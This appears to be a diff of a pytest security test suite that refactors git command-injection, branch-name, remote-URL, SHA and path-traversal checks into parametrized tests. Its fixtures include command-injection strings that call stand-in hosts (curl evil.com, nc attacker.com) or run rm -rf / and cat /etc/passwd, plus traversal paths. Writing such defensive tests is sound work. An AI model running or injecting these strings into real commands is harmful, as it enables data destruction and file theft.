@@ -16,6 +16,8 @@ Audit Categories:
 import re
 from pathlib import Path
 
+import pytest
+
 
 class TestGitHookSecurity:
     """Test git hook installation and execution safety."""
@@ -97,57 +99,61 @@ class TestGitCommandConstruction:
         assert isinstance(safe_command, list), "Commands should be lists"
         assert not isinstance(unsafe_command, list), "String commands are unsafe"
 
-    def test_git_commit_message_escapes_special_chars(self):
-        """Verify git commit messages properly escape shell metacharacters."""
-        dangerous_messages = [
+    @pytest.mark.parametrize(
+        "dangerous_message",
+        [
             "Fix $(curl evil.com)",
             "Update `rm -rf /`",
             "Merge $(whoami)@evil.com",
             "Release | nc attacker.com",
             "Deploy; cat /etc/passwd",
-        ]
+        ],
+    )
+    def test_git_commit_message_escapes_special_chars(self, dangerous_message):
+        """Verify git commit messages properly escape shell metacharacters."""
+        # Safe format: pass as argument, not interpreted by shell
+        safe_cmd = ["git", "commit", "-m", dangerous_message]
+        assert isinstance(
+            safe_cmd, list
+        ), f"Message '{dangerous_message}' handled unsafely"
+        # When passed as list, subprocess.run won't interpret shell syntax
+        assert dangerous_message == safe_cmd[3], "Message should be preserved exactly"
 
-        # Verify each dangerous message would be safely handled
-        for msg in dangerous_messages:
-            # Safe format: pass as argument, not interpreted by shell
-            safe_cmd = ["git", "commit", "-m", msg]
-            assert isinstance(safe_cmd, list), f"Message '{msg}' handled unsafely"
-            # When passed as list, subprocess.run won't interpret shell syntax
-            assert msg == safe_cmd[3], "Message should be preserved exactly"
-
-    def test_git_branch_names_validated_before_checkout(self):
-        """Verify git branch names are validated before use in commands."""
-        dangerous_branch_names = [
+    @pytest.mark.parametrize(
+        "dangerous_branch",
+        [
             "test; rm -rf /",
             "test | cat /etc/passwd",
             "test && curl evil.com",
             "test`whoami`",
             "test$(whoami)",
             "test\n; evil",
-        ]
-
+        ],
+    )
+    def test_git_branch_names_validated_before_checkout(self, dangerous_branch):
+        """Verify git branch names are validated before use in commands."""
         # Safe characters for git branch names: alphanumeric, dash, underscore, slash
         branch_name_pattern = r"^[a-zA-Z0-9\-_/]+$"
+        is_valid = bool(re.match(branch_name_pattern, dangerous_branch))
+        assert (
+            not is_valid
+        ), f"Dangerous branch name '{dangerous_branch}' should be rejected"
 
-        for branch in dangerous_branch_names:
-            is_valid = bool(re.match(branch_name_pattern, branch))
-            assert not is_valid, f"Dangerous branch name '{branch}' should be rejected"
-
-    def test_git_remote_urls_validated_before_fetch_pull(self):
-        """Verify git remote URLs are validated before fetch/pull operations."""
-        dangerous_urls = [
+    @pytest.mark.parametrize(
+        "dangerous_url",
+        [
             "$(curl evil.com)",
             "`whoami`@github.com:user/repo.git",
             "git@github.com:user/repo.git; rm -rf /",
-        ]
-
+        ],
+    )
+    def test_git_remote_urls_validated_before_fetch_pull(self, dangerous_url):
+        """Verify git remote URLs are validated before fetch/pull operations."""
         safe_url_pattern = (
             r"^(https?|git|ssh)://|^git@[a-zA-Z0-9\-\.]+:[a-zA-Z0-9\-_/]+\.git$"
         )
-
-        for url in dangerous_urls:
-            is_valid = bool(re.match(safe_url_pattern, url))
-            assert not is_valid, f"Dangerous URL '{url}' should be rejected"
+        is_valid = bool(re.match(safe_url_pattern, dangerous_url))
+        assert not is_valid, f"Dangerous URL '{dangerous_url}' should be rejected"
 
     def test_git_config_operations_use_safe_parsing(self):
         """Verify git config operations safely parse configuration."""
@@ -164,50 +170,43 @@ class TestGitCommandConstruction:
 class TestGitParsingValidation:
     """Test git branch/commit parsing for validation and safety."""
 
-    def test_git_commit_sha_validates_hex_format(self):
+    @pytest.mark.parametrize(
+        "sha,should_be_valid",
+        [
+            ("a" * 40, True),  # Full SHA-1
+            ("b" * 7, True),  # Short SHA-1
+            ("c" * 64, True),  # Full SHA-256
+            ("d" * 12, True),  # Medium SHA-1
+            ("not-a-sha", False),
+            ("g" * 40, False),  # Contains non-hex character
+            ("z" * 7, False),  # Contains non-hex character
+            ("GHIJKL123456", False),  # Non-hex beyond 'f'
+        ],
+    )
+    def test_git_commit_sha_validates_hex_format(self, sha, should_be_valid):
         """Verify git commit SHAs are validated as hex (40 or 64 chars)."""
-        valid_shas = [
-            "a" * 40,  # Full SHA-1
-            "b" * 7,  # Short SHA-1
-            "c" * 64,  # Full SHA-256
-            "d" * 12,  # Medium SHA-1
-        ]
-
-        invalid_shas = [
-            "not-a-sha",
-            "g" * 40,  # Contains non-hex character
-            "z" * 7,  # Contains non-hex character
-            "GHIJKL123456",  # Non-hex beyond 'f'
-        ]
-
         sha_pattern = r"^[a-f0-9]+$"
+        is_valid = bool(re.match(sha_pattern, sha))
+        assert is_valid == should_be_valid, f"SHA '{sha}' validation mismatch"
 
-        for sha in valid_shas:
-            is_valid = bool(re.match(sha_pattern, sha))
-            assert is_valid, f"Valid SHA '{sha}' should match pattern"
-
-        for sha in invalid_shas:
-            is_valid = bool(re.match(sha_pattern, sha))
-            assert not is_valid, f"Invalid SHA '{sha}' should not match pattern"
-
-    def test_git_branch_name_parsing_rejects_traversal(self):
-        """Verify git branch names can't reference files via traversal."""
-        dangerous_names = [
+    @pytest.mark.parametrize(
+        "dangerous_name",
+        [
             "../../../etc/passwd",
             "../../.git/config",
             "test/../../evil",
             "refs/heads/../../config",
-        ]
-
+        ],
+    )
+    def test_git_branch_name_parsing_rejects_traversal(self, dangerous_name):
+        """Verify git branch names can't reference files via traversal."""
         # Git branch names should not contain leading ../
         safe_pattern = r"^[a-zA-Z0-9\-_/]+$"
+        has_traversal = ".." in dangerous_name
+        is_valid = bool(re.match(safe_pattern, dangerous_name))
 
-        for name in dangerous_names:
-            has_traversal = ".." in name
-            is_valid = bool(re.match(safe_pattern, name))
-
-            assert has_traversal, f"Test setup: '{name}' should have .."
-            assert not is_valid, f"Traversal in '{name}' should be rejected"
+        assert has_traversal, f"Test setup: '{dangerous_name}' should have .."
+        assert not is_valid, f"Traversal in '{dangerous_name}' should be rejected"
 
     def test_git_diff_output_parsing_handles_binary_safely(self):
         """Verify git diff parsing doesn't crash on binary output."""
